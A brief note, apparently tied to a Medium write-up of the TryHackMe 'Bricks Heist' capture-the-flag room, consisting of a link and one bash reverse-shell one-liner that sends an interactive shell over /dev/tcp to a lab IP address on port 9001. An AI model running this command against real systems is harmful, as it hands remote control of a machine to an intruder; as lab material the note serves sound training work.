> https://medium.com/@timnik/tryhack3m-bricks-heist-a0768e9615bf

reverse shell

```
bash -c 'exec bash -i &>/dev/tcp/192.168.247.244/9001 <&1'
```
